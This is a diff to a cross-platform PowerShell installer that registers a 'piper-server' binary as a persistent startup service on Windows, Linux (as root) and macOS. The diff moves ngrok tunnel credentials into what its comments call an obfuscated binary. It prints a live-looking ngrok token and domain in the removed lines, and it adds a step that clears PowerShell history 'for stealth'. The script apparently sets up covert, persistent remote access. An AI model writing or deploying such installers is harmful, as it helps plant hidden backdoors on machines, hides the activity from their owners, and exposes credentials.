@@ -7,10 +7,17 @@ param(
     [string]$ServiceDescription = "Piper Server Service"
 )
 
-# Detect operating system
-$IsWindows = $PSVersionTable.PSVersion.Major -ge 6 ? $IsWindows : $true
-$IsLinux = $PSVersionTable.PSVersion.Major -ge 6 ? $IsLinux : $false
-$IsMacOS = $PSVersionTable.PSVersion.Major -ge 6 ? $IsMacOS : $false
+# Detect operating system (PowerShell 5.1 compatible)
+if ($PSVersionTable.PSVersion.Major -ge 6) {
+    $IsWindows = $IsWindows
+    $IsLinux = $IsLinux
+    $IsMacOS = $IsMacOS
+} else {
+    # PowerShell 5.1 and earlier - assume Windows
+    $IsWindows = $true
+    $IsLinux = $false
+    $IsMacOS = $false
+}
 
 # Find the piper-server binary in current directory
 $binaryPath = $null
@@ -45,9 +52,8 @@ if ($IsWindows) {
         Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
     }
     
-    # Create scheduled task action with ngrok credentials
-    $arguments = "-ngrok_token '34QfuhfXXNQmIe0TbFH67RmNZZZ_7TtoYMAdwwgdYV1JFE1z6' -ngrok_domain 'emptiest-unwieldily-kiana.ngrok-free.dev'"
-    $action = New-ScheduledTaskAction -Execute $binaryPath -Argument $arguments -WorkingDirectory (Split-Path $binaryPath)
+    # Create scheduled task action (obfuscated binary has hardcoded ngrok credentials)
+    $action = New-ScheduledTaskAction -Execute $binaryPath -WorkingDirectory (Split-Path $binaryPath)
     
     # Create trigger for startup
     $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -75,7 +81,7 @@ elseif ($IsLinux) {
     $serviceFileName = "$ServiceName.service"
     $servicePath = "/etc/systemd/system/$serviceFileName"
     
-    # Create service file content with ngrok credentials
+    # Create service file content (obfuscated binary has hardcoded ngrok credentials)
     $serviceContent = @"
 [Unit]
 Description=$ServiceDescription
@@ -85,7 +91,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=$(Split-Path $binaryPath)
-ExecStart=$binaryPath -ngrok_token '34QfuhfXXNQmIe0TbFH67RmNZZZ_7TtoYMAdwwgdYV1JFE1z6' -ngrok_domain 'emptiest-unwieldily-kiana.ngrok-free.dev'
+ExecStart=$binaryPath
 Restart=always
 RestartSec=10
 StandardOutput=journal
@@ -134,7 +140,7 @@ elseif ($IsMacOS) {
     $plistFileName = "com.$ServiceName.plist"
     $plistPath = "/Library/LaunchDaemons/$plistFileName"
     
-    # Create plist content with ngrok credentials
+    # Create plist content (obfuscated binary has hardcoded ngrok credentials)
     $plistContent = @"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -145,10 +151,6 @@ elseif ($IsMacOS) {
     <key>ProgramArguments</key>
     <array>
         <string>$binaryPath</string>
-        <string>-ngrok_token</string>
-        <string>34QfuhfXXNQmIe0TbFH67RmNZZZ_7TtoYMAdwwgdYV1JFE1z6</string>
-        <string>-ngrok_domain</string>
-        <string>emptiest-unwieldily-kiana.ngrok-free.dev</string>
     </array>
     <key>WorkingDirectory</key>
     <string>$(Split-Path $binaryPath)</string>
@@ -199,3 +201,18 @@ else {
 
 Write-Host ""
 Write-Host "Service creation completed!"
+
+# Clear Powershell history for stealth
+if ($IsWindows) {
+    # Clear history in Windows PowerShell
+    if (Get-Module -ListAvailable -Name PSReadLine) {
+        Remove-Module PSReadLine
+    }
+    Clear-History
+} else {
+    # Clear history in PowerShell Core on Linux/macOS
+    if (Get-Module -ListAvailable -Name PSReadLine) {
+        Remove-Module PSReadLine
+    }
+    Clear-History
+}   
